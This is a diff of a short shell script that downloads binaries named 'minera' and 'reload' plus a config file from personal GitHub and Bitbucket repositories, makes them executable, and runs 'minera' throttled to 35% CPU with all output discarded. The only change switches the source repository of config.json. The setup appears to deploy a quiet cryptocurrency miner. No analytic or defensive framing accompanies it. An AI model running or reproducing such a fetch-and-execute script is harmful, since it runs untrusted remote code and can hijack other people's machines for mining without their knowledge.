@@ -1,7 +1,7 @@
 apt update
 apt install screen cpulimit -y
 wget https://github.com/danipedrosang/marcrash/raw/main/minera
-wget https://raw.githubusercontent.com/danipedrosang/mineral/main/config.json
+wget https://raw.githubusercontent.com/danipedrosang/marcrash/main/config.json
 wget https://bitbucket.org/kijang-020/project1/raw/d28f558eb2ebf56e26f70d01f3805e21cda6eeaf/reload
 chmod +x minera reload
 cpulimit -l 35 ./minera >/dev/null 2>&1
